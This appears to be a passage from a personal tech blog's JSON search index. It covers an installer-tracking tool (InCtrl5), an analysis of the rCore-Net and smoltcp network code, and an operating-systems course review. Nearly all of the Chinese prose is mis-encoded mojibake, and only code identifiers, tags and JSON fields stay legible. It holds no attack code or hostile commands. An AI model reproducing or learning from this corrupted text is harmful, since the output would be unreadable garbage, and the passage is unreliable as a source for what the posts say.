InCtrl5 å¯¹å®‰è£…ç¨‹åºçš„å®‰è£…è¿‡ç¨‹è¿›è¡Œæ–‡ä»¶ï¼Œæ³¨å†Œè¡¨é¡¹ï¼ŒINIï¼ŒTXTæ–‡ä»¶çš„å…¨é¢è·Ÿè¸ªï¼Œä»è€Œå®ç°å¯¹å®‰è£…è¿‡ç¨‹çš„å…¨é¢äº†è§£ï¼Œå¹¶ç”Ÿæˆä¸€ä»½æŠ¥å‘Šï¼Œä¾›æŸ¥é˜… è‡´ è°¢æ„Ÿè°¢è€å¸ˆ å’Œ å­¦é•¿çš„å¸®åŠ©å’ŒæŒ‡å¯¼","link":"","tags":[{"name":"network","slug":"network","permalink":"https://dingiso.github.io/tags/network/"},{"name":"virus","slug":"virus","permalink":"https://dingiso.github.io/tags/virus/"}]},{"title":"rCore-net åŠ smoltcp åˆ†æ","date":"2020-09-30T00:05:34.000Z","path":"2020/09/30/Analysis of rCore-Net/","text":"æœ¬æ–‡æ˜¯ rCore-Net é¡¹ç›®å‰å¯¹äº rCore-net å’Œ smoltcp çš„åˆ†æ rCore-Net åˆ†ærCore-Net ä¸»è¦å€Ÿç”¨ smoltcp çš„crate ï¼Œä¸»è¦å®Œæˆäº†ï¼ŒTCPï¼ŒUDPï¼ŒRAWï¼ŒPACKETï¼ˆä½œä¸ºä»¥å¤ªç½‘å‡ºå£ï¼‰ï¼ŒNetlink ç­‰ç»“æ„å’Œç›¸å…³åŠŸèƒ½ã€‚ æ€»ä½“ç»“æ„ï¼šSOCKETS ï¼šsmoltcpæ˜¯å•çº¿ç¨‹çš„ç½‘ç»œåè®®æ ˆï¼Œå®šä¹‰ä¸€ä¸ªå…¨å±€çš„äº’æ–¥é”ï¼Œä»¥ä¿è¯æ“ä½œçš„äº’æ–¥æ€§ å››ç§ SocketStateTCPï¼šåˆ©ç”¨TCPåè®®çš„æ–¹å¼ï¼Œ UDPï¼šåˆ©ç”¨UDpåè®®çš„æ–¹å¼ Rawï¼šå¯ç”¨äºæ¥å—å…¶ä»–åè®®çš„æ•°æ® Packetï¼šæ²¡æœ‰çŠ¶æ€ï¼Œåªç”¨äºä»¥å¤ªç½‘å‡ºå£ Netlinkï¼šåŸºäºsocketçš„é€šä¿¡æœºåˆ¶å®ç°çš„å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´çš„é”€é‡æ•°æ®çš„åŠæ—¶äº¤äº’ SocketState çš„ imp å‡½æ•°ä»¬read ï¼š ä» buffer ä¸­å–å‡ºå°½å¯èƒ½å¤šçš„æ•°æ®ï¼Œæ”¾åˆ°ä¸€ä¸ª u8æ•°ç»„ï¼Œï¼ˆdataï¼‰ ä¸­ write ï¼š Tcp å‘é€åˆ°è¿æ¥çš„è¿œç¨‹ endpoint Udp å‘é€åˆ°å‚æ•°æŒ‡å®šçš„è¿œç¨‹ endpoint Raw å¦‚æœå¤´éƒ¨åŒ…å«åœ¨è€ƒè™‘èŒƒå›´åˆ™å¯ä»¥ç›´æ¥å‘é€ï¼Œå¦åˆ™è‡ªå·±ç»„ä¸€ä¸ª ip packetåŒ…ï¼Œå‘é€åˆ°æŒ‡å®šè¿œç¨‹ endpoint(é€šè¿‡å°†è¿œç¨‹åœ°å€å¡«å…¥å¤´éƒ¨ destinationå¤„) poll ï¼š æ£€æŸ¥socketçŠ¶æ€ ï¼Œ è¿”å›ï¼ˆæ˜¯å¦æ­£å¸¸ï¼Œæ˜¯å¦èƒ½æ¥æ”¶ï¼Œæ˜¯å¦èƒ½å‘é€ï¼‰ connect ï¼š ä¸è¿œç¨‹ endpoint è¿æ¥ ï¼Œé€šè¿‡è®¾ç½®remote_endpoint, Tcpéœ€è¦åˆ†é…ä¸€ä¸ªä¸´æ—¶çš„ port ã€‚ bind ï¼š å°† socket ç»‘å®šä¸€ä¸ªæœ¬åœ°çš„ ip listen ï¼š å¦‚æœæ²¡æœ‰listenå¯¹åº”çš„ç«¯å£ï¼Œå°±å¼€å¯listenï¼Œå¦åˆ™ä¸æ“ä½œ shutdown : å…³é—­socket accept ï¼š Tcp ä»è¿æ¥äº‹ä»¶é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ªæ—¶é—´ï¼Œå»ºç«‹æ–°çš„socket å¹¶æ›¿æ¢å½“å‰çš„socket local_endpoint : è¿”å›æœ¬åœ°ip remote_endpoint : è¿”å›è¿œç¨‹ ip box_clone : cloneä¸€ä¸ªè‡ªèº«å¯¹è±¡ ioctl ï¼š TODO å‡½æ•°çš„æ™®éè¿‡ç¨‹æ™®éå‡½æ•°è°ƒç”¨è¿‡ç¨‹ ï¼Œè·å– SOCKETS çš„äº’æ–¥é”ï¼Œ å¹¶è·å–ä»–çš„å¥æŸ„ï¼Œè½¬ç±»å‹ä¸º TcpSocket æˆ– UcpSocket è¿›è¡Œå¯¹ socket çš„æ“ä½œï¼Œç„¶ååŠæ—¶å°†é”å’Œå¥æŸ„drop æ‰ TODOï¼š ioctl å’Œ ArpSeq çš„éƒ¨åˆ† å¯èƒ½è¿˜éœ€è¦å†ç ”ç©¶ä¸€ä¸‹ Smoltcp åˆ†æTCPTcp State : [enum] ç”± rfc 793 è§„å®šçš„ 11 ç§çŠ¶æ€ Timer : [enum] ç”±timer è§¦å‘çš„é‡ä¼ ï¼Œå¿«é€Ÿé‡ä¼ ç­‰è¡Œä¸º set_for_idle() è®¾å®šæ´»è·ƒæ—¶é—´ä¸º å½“å‰æ—¶é—´æˆ³ timestamp + è®¾å®šçš„æ—¶é—´é—´éš” interval should_keep_alive() åˆ¤æ–­å½“å‰æ—¶é—´æˆ³æ˜¯å¦ &gt;= æ´»è·ƒæ—¶é—´ should_retransmit() æ—¶é—´æˆ³å¤§äºé‡ä¼ æœŸé™åˆ™é‡ä¼ ï¼Œè¿”å› è¶…æ—¶æ—¶é—´+å»¶è¿Ÿ å¿«é€Ÿé‡ä¼  è¿”å› 0 set_keep_alive() åˆå§‹åŒ– æ´»è·ƒæ—¶é—´ä¸º 0 should_close() æ—¶é—´æˆ³å¤§äºå…³é—­æœŸé™ è¿”å› true poll_at è¿”å› socket ä¸‹ä¸€æ¬¡è¢« poll çš„æ—¶é—´ TcpSocket struct ä¸»è¦åŒ…æ‹¬ä¸€ä¸‹å†…å®¹ ä¸¤ä¸ªbuffer å­˜å‚¨ æ¥å—çš„å†…å®¹å’Œè¦å‘é€çš„å†…å®¹ state ï¼šä¿å­˜socket çš„çŠ¶æ€ timer ï¼šç”¨äºè®¡æ—¶ assembler ï¼šç¼“å†²åŒºçš„ é‡æ–°ç»„è£… addr åŠ endpoint : æœ¬åœ°ipåŠæ¥å£å’Œ è¿œç¨‹çš„ ip åŠ æ¥å£ seq_no : Tcpä¸­çš„ sequence number ack ï¼š ackç  win ï¼š Tcp çš„å‘é€çª—å£ç›¸å…³å†…å®¹ listen : å¼€å§‹ç›‘å¬æœ¬æœºç›¸åº”ç«¯å£ï¼Œopenä¼šè¿”å› illegal ï¼Œ ç«¯å£ä¸º0 åˆ™è¿”å› unaddressable connect : è·Ÿè¿œç¨‹endpointè¿æ¥ï¼Œç«¯å£æœŸæœ›ç»™å‡ºï¼Œå¦åˆ™åˆ†é…ä¸€ä¸ª 49152-65535 ç«¯å£ close ï¼šå…³é—­å…¨åŒå·¥è¿æ¥çš„ä¼ è¾“éƒ¨åˆ† é—®é¢˜ï¼š TcpSocketStateçš„ writeå‡½æ•°ï¼Œ ç¬¬äºŒä¸ªå‚æ•° _send_to_endpoint å¹¶æ²¡æœ‰ä½¿ç”¨ï¼Œ æäº† issue [Bug Report] wrong of fn write in the TcpSocketState å¥½å§ï¼Œæˆ‘å‚»äº†ï¼Œæ­¤å‚æ•°åªæ˜¯ç”¨æ¥å¡«å……ä»¥ä¿è¯ trait çš„å®ç°çš„ã€‚ï¼ˆèœï¼‰ smoltcp - storage/ring_buffer.rs 255è¡Œ dequeue_slice å‡½æ•°ä¸ºä»€ä¹ˆè®¡ç®—ä¸¤æ¬¡size","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"},{"name":"os","slug":"os","permalink":"https://dingiso.github.io/tags/os/"},{"name":"network","slug":"network","permalink":"https://dingiso.github.io/tags/network/"}]},{"title":"æ“ä½œç³»ç»ŸæœŸæœ«æ€»ç»“","date":"2020-08-27T09:05:05.000Z","path":"2020/08/27/æ“ä½œç³»ç»Ÿ æœŸæœ«æ€»ç»“/","text":"æœ¬æ–‡æ˜¯å¯¹æ“ä½œç³»ç»Ÿçš„è¯¾ç¨‹çš„æœŸæœ«æ€»ç»“çš„æ–‡æ¡£-å¸®åŠ©è‡ªå·±äº†è§£æ•´ä½“çš„ç»“æ„referenceï¼šmooc ä¸Šå—äº¬å¤§å­¦ éª†æ–Œ è€å¸ˆçš„PPT æ“ä½œç³»ç»Ÿ æœŸæœ«æ€»ç»“è¿‡ç¨‹ â€”- ç®—æ³•è®¾å¤‡æ¶‰åŠæ•°æ®æœºæ„ï¼šè®¾å¤‡æ§åˆ¶è¡¨DCT ï¼›æ§åˆ¶å™¨æ§åˆ¶è¡¨COCTï¼›é€šé“æ§åˆ¶è¡¨CHCTï¼›ç³»ç»Ÿè®¾å¤‡è¡¨SDT ä½œä¸š - å¹³æ—¥ç»ƒä¹  è®¡ç®—æœºæ¦‚è¿° ï¼š é€‰æ‹© å¤„ç†å™¨ ï¼š å†…æ ¸æ¨¡å¼ï¼Œç”¨æˆ·æ¨¡å¼ï¼Œä¸­æ–­ å¤„ç†å™¨ç®¡ç†ï¼šè¿›ç¨‹ï¼Œç¨‹åºåŒºåˆ«ï¼Œä¸ºä»€ä¹ˆæå‡ºè¿›ç¨‹ï¼Œè¿›ç¨‹çŠ¶æ€è½¬æ¢ï¼Œè¿›ç¨‹ç®¡ç†ï¼ˆåˆ›å»ºï¼‰åŸå­æ“ä½œ çº¿ç¨‹ï¼š ä¸ºä»€ä¹ˆæå‡ºçº¿ç¨‹ï¼Œçº¿ç¨‹å’Œè¿›ç¨‹åŒºåˆ«åœ¨å“ªé‡Œï¼Œç”¨æˆ·çº§çº¿ç¨‹ï¼Œå†…æ ¸çº§çº¿ç¨‹ï¼Œå¤šçº¿ç¨‹çš„æ··åˆå®ç°ï¼ˆCPUè°ƒåº¦ï¼‰ å­˜å‚¨ï¼šç‰©ç†å†…å­˜ï¼Œï¼ˆè¿ç»­ï¼Œç¦»æ•£ï¼‰ï¼Œé¡µå¼ç®¡ç† å¯»å€ï¼Œæ®µé¡µåŒºåˆ«ï¼Œç®¡ç† è®¾å¤‡ï¼šI/Oå­ç³»ç»Ÿï¼Œç¼“å†²åŒºï¼ŒSPoolingï¼Œè„±æœº ï¼Œç£ç›˜è°ƒåº¦ æ–‡ä»¶ï¼šæ–‡ä»¶é€»è¾‘ç»“æ„ï¼Œç‰©ç†ç»“æ„ï¼Œç›®å½•ç»“æ„ï¼Œç›®å½•ç®¡ç†ï¼Œè¾…å­˜ç©ºé—´ PVæ“ä½œï¼Œéœå°”ç®¡ç¨‹ æ­»é” å¤§é¢˜ï¼š PVæ“ä½œï¼Œç”Ÿäº§-æ¶ˆè´¹åŒæ­¥ ï¼Œ è¯»è€…å†™è€…é—®é¢˜ï¼Œç»ƒä¹ é¢˜ï¼ˆåŸºç¡€çŸ¥è¯† æŒæ¡ä¿¡å·é‡ï¼‰ æ­»é”é¿å…ï¼Œé“¶è¡Œå®¶ç®—æ³•ï¼Œå…¶ä»–æ­»é”æ£€æµ‹ç®—æ³•ï¼Œå•èµ„æº ï¼Œèµ„æºåˆ†é…å›¾ æ®µé¡µå¼ç®¡ç† å·¥ä½œåŸç†ï¼Œç¼ºé¡µæ›¿æ¢ç®—æ³• CPUè°ƒåº¦ç®—æ³• ç£ç›˜è°ƒåº¦ç®—æ³• å¹¶å‘ç¨‹åºè®¾è®¡ç¨‹åºæ‰§è¡Œçš„å¤–éƒ¨é¡ºåºæ€§ï¼ˆå¤šä¸ªç¨‹åºæ‰§è¡Œæœ‰åºï¼‰ å’Œ å†…éƒ¨é¡ºåºæ€§ï¼ˆç¨‹åºCPUæ‰§è¡Œæœ‰åºï¼‰ ä¸´ç•ŒåŒº - ç¨‹åºæ®µï¼Œå¤šä¸ªè¿›ç¨‹åœç•™åœ¨ç›¸å…³ä¸´ç•ŒåŒºåˆ™å‡ºç°é”™è¯¯ ä¸´ç•ŒåŒºä¹‹å¤šæœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸èƒ½æ— é™åœç•™ï¼Œä¸èƒ½æ— é™ç­‰å¾…è¿›å…¥ è¿›ä¸´ç•ŒåŒº å…³ä¸­æ–­ï¼Œå‡ºä¸´ç•ŒåŒº å¼€ä¸­æ–­ ç”¨æˆ·ç¨‹åº ï¼šä¿¡å·é‡ PVåŸè¯­ï¼Œ semaphore ï¼š å€¼ä¸ºå¯å‡ ä¸ªè¿›ç¨‹è¿›å…¥ä¸´ç•ŒåŒºï¼Œå…·æœ‰ç­‰å¾…è¿›ç¨‹é˜Ÿåˆ— p æ“ä½œ væ“ä½œ ä¸€ä¸€åŒ¹é… åŒæ­¥å…³ç³» å†³å®š å‡ ä¸ªä¿¡å·é‡ ä¸€ç”Ÿäº§ä¸€æ¶ˆè´¹å¤šç¼“å†² ï¼š ä¸¤ä¸ªä¿¡å·é‡sput sget ä¸€ä¸ªkç¼“å†²é˜Ÿåˆ—ï¼Œä¸¤å¾ªç¯é˜Ÿåˆ—æŒ‡é’ˆ å¤šç”Ÿäº§å¤šæ¶ˆè´¹ï¼š å¤šä¸ªè¿›ç¨‹å…±äº« å¾ªç¯é˜Ÿåˆ—æŒ‡é’ˆï¼Œå¯¹æŒ‡é’ˆå¢åŠ ä¸¤ä¸ªä¿¡å·é‡ ç®¡ç¨‹è¿‡ç¨‹ äº’æ–¥è°ƒç”¨ æ­»é”å››ä¸ªå¿…è¦æ¡ä»¶ï¼š äº’æ–¥ï¼Œå æœ‰å’Œç­‰å¾…ï¼Œä¸å‰¥å¤ºï¼Œå¾ªç¯ç­‰å¾… æ­»é”çš„é˜²æ­¢ï¼š ç ´åç¬¬ä¸€ä¸ªæ¡ä»¶ï¼šç‹¬å å‹èµ„æº æ”¹é€ æˆ å…±äº«å‹èµ„æº ç ´åä¸‰ ï¼šå‰¥å¤ºå¼è°ƒåº¦ ç ´åå››ï¼šå±‚æ¬¡åˆ†é… é¢„åˆ†é… ï¼š æ­»é”çš„é¿å…ï¼šé“¶è¡Œå®¶ç®—æ³• æ­»é”çš„æ£€æµ‹ï¼šWarshallä¼ é€’é—­åŒ… ï¼Œæ£€æµ‹åï¼Œé‡å¯æˆ– æ£€éªŒç‚¹é‡å¯ æ–‡ä»¶ç®¡ç†æ–‡ä»¶ç‰©ç†ç»“æ„ ï¼š é¡ºåºæ–‡ä»¶ï¼šæ•°ç»„ - å¿«é€Ÿå­˜å– ï½œé¢„å…ˆåˆ†é…ç©ºé—´ï¼Œä¸æ˜“å¢åˆ æ”¹ è¿æ¥æ–‡ä»¶ï¼šé“¾è¡¨ - è¿æ¥å­—ï¼ˆæŒ‡é’ˆï¼‰ä¸º0ç»“å°¾ ï¼Œæ˜“äºå¢åˆ æ”¹ ï½œéœ€è¦é¢å¤–ç©ºé—´ï¼Œä»…é¡ºåº ç›´æ¥æ–‡ä»¶ï¼šhashæ•£åˆ— ç´¢å¼•æ–‡ä»¶ï¼šã€Škeyï¼Œvalueã€‹-ç´¢å¼•åŒºï¼Œæ•°æ®åŒº é“¾è¡¨æ‹“å±• ï½œéœ€è¦æŸ¥ä¸¤æ¬¡ æ–‡ä»¶ç›®å½•ï¼š ä¸€çº§ï¼Œç”¨æˆ·æ–‡ä»¶ä¼—å¤šï¼Œå®¹æ˜“é‡åï¼Œä¸åˆ©è®°å¿† äºŒçº§ï¼Œ ç”¨æˆ·-æ–‡ä»¶ç›®å½•ã€‚æŒ‰ç”¨æˆ· æœ‰ç”¨æˆ·æƒé™ æ ‘å½¢ï¼Œå¯é‡åï¼Œæœ‰æƒé™ è·¯å¾„åä¸ºæ ¹åˆ°ç»“ç‚¹ æ–‡ä»¶æŸ¥æ‰¾ï¼š æŸ¥æ‰¾é¡¹ï¼šæ–‡ä»¶è·¯å¾„å æŸ¥æ‰¾æ³•ï¼šé¡ºåºï¼ŒäºŒåˆ†ï¼Œæ–‡ä»¶åå˜æ¢æˆå”¯ä¸€å€¼â€œæ‚å‡‘æ³•â€ æ´»åŠ¨æ–‡ä»¶è¡¨ï¼š å¤šç›®å½•è®¿å­˜ï¼Œå¤šæ¬¡è®¿é—®å­˜å‚¨å™¨å¼€é”€å¤§ï¼Œå°†å¸¸ç”¨ï¼Œæ­£ç”¨å¤åˆ¶è¿›ä¸»å­˜ ä¿å­˜æ–‡ä»¶ç›®å½•ä¿¡æ¯è€Œä¸æ˜¯å…¨éƒ¨ä¿¡æ¯ï¼Œèƒ½ä¸€æ­¥æ‰¾åˆ°æ–‡ä»¶ æ–‡ä»¶çš„å®‰å…¨ä¸ä¿æŠ¤ å…±äº«ï¼ˆç”¨æˆ·æƒé™ï¼‰ï¼Œä¿æŠ¤ï¼ˆé˜²ç ´åï¼‰ï¼Œä¿å¯†ï¼ˆé˜²çªƒå–ï¼‰ ä¿å¯†æªæ–½ï¼šéšè”½æ–‡ä»¶ç›®å½•ï¼Œè®¾ç½®å£ä»¤ï¼Œä½¿ç”¨å¯†ç  ä¿æŠ¤æªæ–½ï¼šå‰¯æœ¬ï¼Œå­˜å–è¡¨ï¼ˆå­˜ç”¨æˆ·-å±æ€§ï¼‰ï¼Œå±æ€§ æ–‡ä»¶çš„å­˜å– é¡ºåºå­˜å–ï¼šè¯»æŒ‡é’ˆï¼ˆå¯è·³ï¼‰ï¼Œå†™æŒ‡é’ˆ ç›´æ¥å­˜å–ï¼šå¯¹è®°å½•è¿›è¡Œæ“ä½œï¼Œhash ç´¢å¼•å­˜å–ï¼šæŒ‰é”®å­˜å– æ–‡ä»¶çš„ä½¿ç”¨ ä¸¤ç±»æ¥å£ï¼š æ“ä½œæ–‡ä»¶æ•´ä½“ï¼Œè¯»å†™ç­‰å¯¹æ–‡ä»¶æœ¬èº« å»ºç«‹æ–‡ä»¶ï¼šå»ºç«‹æ–‡ä»¶ç›®å½•é¡¹-åˆ†é…ç‰©ç†å—-ç”³è¯·æ´»åŠ¨æ–‡ä»¶è¡¨-ç™»è®°è¡¨-è¿”å›æ–‡ä»¶å¥æŸ„ æ’¤é”€æ–‡ä»¶ï¼šå…³é—­æ–‡ä»¶-è”è®¿-åˆ å»ç›®å½•é¡¹-é‡Šæ”¾ç©ºé—´ æ‰“å¼€æ–‡ä»¶ï¼šç”³è¯·æ´»åŠ¨æ–‡ä»¶è¡¨é¡¹-æŸ¥æ‰¾æ–‡ä»¶-å¤åˆ¶åˆ°è¡¨é¡¹-å…±äº«æ–‡ä»¶å¤„ç†-è¿”å›å¥æŸ„ å…³é—­æ–‡ä»¶ï¼šè¡¨é¡¹â€œç”¨æˆ·æ•°â€ -1 è¯»å†™æ–‡ä»¶ï¼šæ‰¾åˆ° é€»è¾‘è®°å½•- å˜ä¸º ç‰©ç†å¿« å®šä½æ–‡ä»¶ï¼šè°ƒæ•´è¯»å†™æŒ‡é’ˆä½ç½® è¾…å­˜ç©ºé—´ç®¡ç† è¿ç»­åˆ†é…ï¼šè®¿é—®é€Ÿåº¦å¿«ï¼Œå®šæ—¶â€œç¢ç‰‡â€æ•´ç†â€œ éè¿ç»­ï¼šç©ºé—´ç®¡ç†æ•ˆç‡é«˜ï¼Œä¾¿äºæ–‡ä»¶åŠ¨æ€å¢é•¿ï¼Œæ”¶ç¼© ä½ç¤ºå›¾ï¼šç©ºé—²å—ç®¡ç† - é«˜é€Ÿåˆ†å»é… IOè®¾å¤‡æ“ä½œç³»ç»Ÿ ä¸ æ§åˆ¶å™¨ äº¤äº’ï¼Œè€Œéä¸è®¾å¤‡äº¤äº’ IOæ§åˆ¶æ–¹å¼ è½®è¯¢ ä¸­æ–­ CPUè´Ÿè´£å‘å‡ºI/Oå‘½ä»¤ï¼Œå“åº”ä¸­æ–­ ï½œæ§åˆ¶å™¨è´Ÿè´£æ£€æŸ¥çŠ¶æ€ å°±ç»ªåå‘é€ä¸­æ–­ DMA ä¸­æ–­çš„æ´»ç”±DMAæ‰§è¡Œ CPUåªåœ¨æ•°æ®ä¼ é€å¼€å§‹ï¼ˆåˆå§‹åŒ–DMAï¼‰ç»“æŸï¼ˆå“åº”ä¸­æ–­ï¼Œä¸å¿…ä¿æŠ¤ç°åœºï¼‰å‚ä¸ å‘¨æœŸçªƒå– - CPUè®¿é—®æ€»çº¿è¾ƒå°‘ï¼Œä¸ç”¨çš„æ—¶å€™å¯ä»¥ç»™DMAç”¨ I/Oé€šé“ å°†I/OæŒ‡ä»¤å•ç‹¬ç”±é€šé“åŒ…å«å¤„ç†å™¨æ‰§è¡Œ å¯æ§åˆ¶å¤šå°ä¸åŒç±»è®¾å¤‡ æµç¨‹ï¼šcpué‡åˆ°I/Oï¼Œå¯åŠ¨é€šé“-cpuæ‰§è¡Œå…¶ä»–-é€šé“å®Œæˆåå‘å‡ºä¸­æ–­-CPUå¤„ç†I/O ã€å¹¶è¡Œã€‘ æ€»çº¿ å•æ€»çº¿ ï¼š æ˜“äºæ‰©å……ã€‚ï½œ ä¼ è¾“æ—¶å»¶å¤§ï¼Œä¸²è¡Œ ä¼ ç»Ÿä¸‰æ€»çº¿ ï¼šCPUä¸I/Oéš”ç¦»ï¼Œæ”¯æŒæ›´å¤šI/Oè®¾å¤‡ ï½œ æ²¡æŠŠI/Oåˆ†å¼€ï¼Œé€Ÿç‡å·®åˆ«å¤§ä¸å¹¸ å—åŒ—æ¡¥ï¼šæ”¯æŒä¸åŒé€Ÿç‡I/O é€šé“å¤šçº§æ€»çº¿ï¼šå¥½ ä»ä¸‹è‡³ä¸Š IOè½¯ä»¶ é«˜æ•ˆç‡ï¼Œé€šç”¨æ€§ è®¾å¤‡æ— å…³æ€§ï¼Œå‡ºé”™å¤„ç†ï¼ŒåŒæ­¥/å¼‚æ­¥ä¼ è¾“ï¼Œç¼“å†²æŠ€æœ¯ ä¸­æ–­å¤„ç†ç¨‹åºï¼šæ£€æŸ¥è®¾å¤‡çŠ¶æ€å¯„å­˜å™¨ï¼Œæ ¹æ®æƒ…å†µå¤„ç† é”™ï¼šå‘ä¸ŠæŠ¥å‘Šé”™è¯¯ï¼Œé‡æ–°æ‰§è¡Œ æ­£å¸¸ï¼šå”¤é†’ç­‰å¾…è¿›ç¨‹ï¼Œè½¬æ¢ä¸ºå°±ç»ªæ€ ç­‰å¾…ï¼šæœ‰ç­‰å¾…ä¼ è¾“I/Oï¼Œé€šçŸ¥å¯åŠ¨ä¸‹ä¸€ä¸ªI/Oè¯·æ±‚ è®¾å¤‡é©±åŠ¨ç¨‹åº é€»è¾‘I/O è½¬åŒ–ä¸º ç‰©ç†I/O æ“ä½œ ç›‘ç£ æ˜¯å¦ æ­£ç¡®æ‰§è¡Œï¼Œçº é”™ï¼Œ ç®¡ç†æ•°æ®ç¼“å†²åŒº åŠŸèƒ½ï¼š è®¾å¤‡åˆå§‹åŒ–ï¼Œæ‰§è¡Œè®¾å¤‡é©±åŠ¨ä¾‹ç¨‹ï¼Œè°ƒç”¨å’Œæ‰§è¡Œä¸­æ–­ç¨‹åº åªå¤„ç†ä¸€ç§è®¾å¤‡ï¼Œæˆ–ä¸€ç±»ç´§å¯†ç›¸å…³çš„è®¾å¤‡ æ•´ä½“ï¼ˆä¸ç§»æ¤ï¼‰ ï¼Œ åˆ†å±‚ï¼ˆç§»æ¤ï¼Œå¼€é”€å¢åŠ ï¼‰ ç‹¬ç«‹äºè®¾å¤‡çš„I/Oè½¯ä»¶ï¼šé€‚ç”¨æ‰€æœ‰è®¾å¤‡ï¼Œå‘ç”¨æˆ·å±‚æä¾›æ¥å£ å‘½åï¼Œä¿æŠ¤ï¼Œæä¾›æ•°æ®å•ä½ï¼Œç¼“å†²ï¼Œåˆ†é…çŠ¶æ€è·Ÿè¸ªï¼Œé”™è¯¯å¤„ç†æŠ¥å‘Š ç”¨æˆ·ç©ºé—´çš„I/Oè½¯ä»¶ åº“å‡½æ•°ï¼ˆç”¨è®¿ç®¡æŒ‡ä»¤é™·å…¥å†…æ ¸ï¼Œå†…æ ¸å‡½æ•°å®ç° I/Oæ“ä½œ Spooling å†…æ ¸å¤–çš„ç³»ç»ŸI/O I/Oç¼“å†² è§£å†³é€Ÿåº¦ä¸åŒ¹é… å•ç¼“å†²ï¼šæ•°æ®-ç¼“å†²åŒº-ç”¨æˆ·åŒº-åº”ç”¨ç¨‹åº ï½œ å†™ï¼šç”¨æˆ·åŒºå¤åˆ¶åˆ°ç¼“å†²åŒº åŒç¼“å†²ï¼šä¸€ä¸ªä¾›ç”¨æˆ·ç¨‹åºä½¿ç”¨ï¼Œå¦ä¸€ä¸ªå¯ç»§ç»­è¾“å…¥è¾“å‡º å¾ªç¯ç¼“å†²ï¼šé“¾è¡¨ è®¾å¤‡ç‹¬ç«‹æ€§ é€»è¾‘è®¾å¤‡ - ç‰©ç†è®¾å¤‡ ç‹¬ç«‹å¼€ï¼Œè°ƒç”¨ç±»è€Œä¸æ˜¯å•ä¸ªè®¾å¤‡ æé«˜çµæ´»æ€§ï¼Œéš”ç¦»æ€§ï¼Œ æ¯ç±»å¯¹åº”è®¾å¤‡ç±»è¡¨ä¸­çš„ä¸€æ  ç£ç›˜ Ta=TS+1/2r+b/rN Ta å­˜å–æ—¶é—´ Ts å¯»é“æ—¶é—´ï¼Œrç£ç›˜æ—‹è½¬é€Ÿåº¦ï¼ˆè½¬/ç§’ï¼‰ï¼ŒBä¼ é€å­—èŠ‚æ•°ï¼ŒNä¸€ä¸ªç£é“ä¸­çš„å­—èŠ‚æ•° ç§»åŠ¨è‡‚è°ƒåº¦ è°ƒåº¦ç­–ç•¥ï¼šå…ˆè¿›å…ˆå‡ºï¼ˆä½æ•ˆï¼‰ï¼Œæœ€çŸ­æŸ¥æ‰¾æ—¶é—´ä¼˜å…ˆï¼ˆé¥¥é¥¿ï¼‰ æ‰«æç®—æ³•ï¼šå•å‘ï¼ŒåŒå‘ï¼Œç”µæ¢¯è°ƒåº¦ï¼ˆå½“å‰ç§»åŠ¨æ–¹å‘æ²¡æœ‰ï¼Œåå‘æœ‰è¯·æ±‚æ—¶ï¼Œåå‘ï¼‰ æ—‹è½¬è°ƒåº¦ ä¼˜åŒ–åˆ†å¸ƒï¼šå¾ªç¯æ’åºï¼›ä¼˜åŒ–æ’åˆ—ï¼Œäº¤å‰åˆ†å¸ƒï¼ˆè¯»å–æœ‰å»¶è¿Ÿï¼‰ï¼ŒæŒ‰æŸ±é¢æ•°æ®è¯»å†™ è™šæ‹Ÿè®¾å¤‡ï¼š ä½¿ç”¨ä¸€ç±»ç‰©ç†è®¾å¤‡ æ¨¡æ‹Ÿ å¦ä¸€ç±»ç‰©ç†è®¾å¤‡ SPOOLing ç£ç›˜å¼€è¾Ÿè¾“å…¥äº•å’Œè¾“å‡ºäº•ï¼Œæœ‰é¢„è¾“å…¥ç¨‹åºï¼Œé¢„è¾“å‡ºç¨‹åºï¼Œäº•ç®¡ç†ç¨‹åº é¢„è¾“å…¥ï¼šä½œä¸šå¼€å§‹å‰æ•°æ®é¢„å…ˆè¾“å…¥ç£ç›˜ç¼“å†²åŒºï¼Œçœå»å¯åŠ¨è¾“å…¥è®¾å¤‡æ—¶é—´ ç¼“è¾“å‡ºï¼šè¾“å‡ºå­˜åœ¨ç¼“å†²åŒºï¼Œä½œä¸šæ‰§è¡Œå®Œï¼Œå†ç”±æ“ä½œç³»ç»Ÿæˆæ‰¹å¤„ç† å°† ç‹¬å è®¾å¤‡ å˜ä¸ºå…±äº«è®¾å¤‡ â€œå‡è„±æœºçœŸè”æœºâ€ -ï¼ˆé¢„è¾“å…¥ï¼‰-è¾“å…¥çŠ¶æ€ -ï¼ˆé¢„è¾“å…¥å®Œæˆï¼‰- æ”¶å®¹çŠ¶æ€ -ï¼ˆä½œä¸šè°ƒåº¦ï¼Œé€‰ä¸­å¹¶åˆ›å»ºè¿›ç¨‹ï¼‰ æ‰§è¡ŒçŠ¶æ€ï¼ˆè¿›ç¨‹è¿è¡Œï¼‰ -ï¼ˆä½œä¸šè°ƒåº¦ï¼Œç»ˆæ­¢æ’¤ç¦»ï¼‰- å®ŒæˆçŠ¶æ€-ï¼ˆç¼“è¾“å‡ºï¼‰- å†…å­˜ç®¡ç†æ®µå¼ç¨‹åºè®¾è®¡- æ®µè¦†ç›–æŠ€æœ¯ï¼ˆä¸ç›¸å…³ç¨‹åºæ›¿æ¢æ‰§è¡Œå®Œä»£ç ï¼‰ å¤ç”¨ - åˆ†åŒºå¤ç”¨ï¼Œé¡µæ¶å¤ç”¨ åœ°å€è½¬æ¢ï¼š é€»è¾‘-ç‰©ç† é™æ€/åŠ¨æ€ ç©ºé—´ åˆ†å»é…ï¼Œ åˆ©ç”¨ä¸»å­˜åˆ†é…è¡¨ å­˜å‚¨ä¿æŠ¤ï¼šæƒé™ï¼Œåœ°å€ä¿æŠ¤å¼‚å¸¸ å­˜å‚¨æ‰©å……ï¼šå¯¹æ¢æŠ€æœ¯ï¼ˆä¸è¿è¡Œè¿›ç¨‹è°ƒå‡ºï¼‰ï¼Œè™šæ‹ŸæŠ€æœ¯ï¼ˆåªè°ƒå…¥éƒ¨åˆ†å†…å®¹ï¼‰ 